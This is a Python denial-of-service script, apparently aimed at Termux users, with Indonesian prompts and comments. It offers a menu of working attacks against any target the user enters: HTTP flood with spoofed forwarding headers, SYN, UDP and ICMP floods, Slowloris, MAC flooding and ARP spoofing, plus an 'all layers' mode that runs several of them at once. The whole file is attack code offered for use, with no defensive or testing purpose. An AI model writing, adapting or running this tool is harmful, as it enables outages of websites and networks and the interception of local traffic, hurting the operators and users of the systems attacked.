#!/usr/bin/env python3
# edi.py - Ry7's SevenLayer DDoS Tool for Termux

import socket
import threading
import random
import time
import sys
import os
import requests
from urllib.parse import urlparse

# Warna buat tampilan
G = '\033[92m'
R = '\033[91m'
B = '\033[94m'
W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{R}
    ███████╗██████╗ ██╗
    ██╔════╝██╔══██╗██║
    █████╗  ██║  ██║██║
    ██╔══╝  ██║  ██║██║
    ███████╗██████╔╝██║
    ╚══════╝╚═════╝ ╚═╝{W}
    {G}EDISI RY7 - 7 Layer Attacker{W}
    """)

# HTTP Flood (Layer 7)
def http_flood(url, duration):
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)',
            'Mozilla/5.0 (Linux; Android 11)'
        ]),
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    }
    end = time.time() + duration
    while time.time() < end:
        try:
            requests.get(url, headers=headers, timeout=2)
        except:
            pass

# SYN Flood (Layer 4) - butuh root
def syn_flood(ip, port, duration):
    try:
        from scapy.all import IP, TCP, send
        end = time.time() + duration
        while time.time() < end:
            pkt = IP(dst=ip)/TCP(dport=port, flags='S', seq=random.randint(1,10000))
            send(pkt, verbose=False)
    except:
        pass

# UDP Flood (Layer 4)
def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    end = time.time() + duration
    while time.time() < end:
        sock.sendto(data, (ip, port))

# ICMP Flood (Layer 3) - butuh root
def icmp_flood(ip, duration):
    try:
        from scapy.all import IP, ICMP, send
        end = time.time() + duration
        while time.time() < end:
            pkt = IP(dst=ip)/ICMP()
            send(pkt, verbose=False)
    except:
        pass

# Slowloris (Layer 7 partial)
def slowloris(ip, port, duration):
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {ip}\r\n".encode())
            sockets.append(s)
        except:
            pass
    end = time.time() + duration
    while time.time() < end:
        for s in sockets:
            try:
                s.send(f"X-{random.randint(0,5000)}: {random.randint(0,5000)}\r\n".encode())
            except:
                sockets.remove(s)
        time.sleep(5)

# MAC Flood (Layer 2) - butuh root & interface
def mac_flood(iface, duration):
    try:
        from scapy.all import Ether, IP, ICMP, sendp
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/ICMP()
        end = time.time() + duration
        while time.time() < end:
            sendp(pkt, iface=iface, verbose=False)
    except:
        pass

# ARP Spoof (Layer 2) - butuh root
def arp_spoof(target_ip, gateway_ip, iface, duration):
    try:
        from scapy.all import ARP, send
        pkt = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        end = time.time() + duration
        while time.time() < end:
            send(pkt, iface=iface, verbose=False)
    except:
        pass

def main():
    banner()
    print(f"""{B}[1] HTTP Flood (Layer 7)
[2] SYN Flood (Layer 4) - butuh root
[3] UDP Flood (Layer 4)
[4] ICMP Flood (Layer 3) - butuh root
[5] Slowloris (Layer 7)
[6] MAC Flood (Layer 2) - butuh root & interface
[7] ARP Spoof (Layer 2) - butuh root
[8] ALL LAYERS (NUKLIR) - butuh root untuk layer 2-4{W}""")
    pilih = input(f"{G}>> {W}")

    if pilih not in ['1','2','3','4','5','6','7','8']:
        print(f"{R}Pilihan salah{W}")
        return

    target = input(f"{G}Target URL/IP: {W}")
    ip_target = ""
    url_target = ""
    if target.startswith("http"):
        parsed = urlparse(target)
        ip_target = socket.gethostbyname(parsed.netloc)
        url_target = target
    else:
        ip_target = target
        url_target = f"http://{target}"

    port = int(input(f"{G}Port (default 80): {W}") or "80")
    threads = int(input(f"{G}Jumlah threads (default 500): {W}") or "500")
    duration = int(input(f"{G}Durasi (detik): {W}"))

    print(f"{R}[!] SERANGAN DIMULAI [!]{W}")
    
    if pilih == '1':
        for _ in range(threads):
            threading.Thread(target=http_flood, args=(url_target, duration)).start()
        time.sleep(duration)
    
    elif pilih == '2':
        for _ in range(threads):
            threading.Thread(target=syn_flood, args=(ip_target, port, duration)).start()
        time.sleep(duration)
    
    elif pilih == '3':
        for _ in range(threads):
            threading.Thread(target=udp_flood, args=(ip_target, port, duration)).start()
        time.sleep(duration)
    
    elif pilih == '4':
        for _ in range(threads):
            threading.Thread(target=icmp_flood, args=(ip_target, duration)).start()
        time.sleep(duration)
    
    elif pilih == '5':
        for _ in range(threads//10 + 1):
            threading.Thread(target=slowloris, args=(ip_target, port, duration)).start()
        time.sleep(duration)
    
    elif pilih == '6':
        iface = input(f"{G}Interface (contoh: wlan0, eth0): {W}")
        threading.Thread(target=mac_flood, args=(iface, duration)).start()
        time.sleep(duration)
    
    elif pilih == '7':
        gateway = input(f"{G}Gateway IP: {W}")
        iface = input(f"{G}Interface: {W}")
        threading.Thread(target=arp_spoof, args=(ip_target, gateway, iface, duration)).start()
        time.sleep(duration)
    
    elif pilih == '8':
        # NUKLIR: semua layer dijalankan bersamaan
        # HTTP
        for _ in range(threads//5):
            threading.Thread(target=http_flood, args=(url_target, duration)).start()
        # UDP
        for _ in range(threads//5):
            threading.Thread(target=udp_flood, args=(ip_target, port, duration)).start()
        # Slowloris
        for _ in range(threads//50):
            threading.Thread(target=slowloris, args=(ip_target, port, duration)).start()
        # Root layer (jika root)
        try:
            from scapy.all import IP, TCP, ICMP, send, Ether, sendp, ARP
            threading.Thread(target=syn_flood, args=(ip_target, port, duration)).start()
            threading.Thread(target=icmp_flood, args=(ip_target, duration)).start()
            # MAC Flood
            iface = input(f"{G}Interface untuk MAC flood: {W}")
            threading.Thread(target=mac_flood, args=(iface, duration)).start()
        except:
            print(f"{R}[!] Root modules tidak tersedia, lewati layer 2-4{W}")
        time.sleep(duration)
    
    print(f"{G}[+] Serangan selesai{W}")

if __name__ == "__main__":
    main()
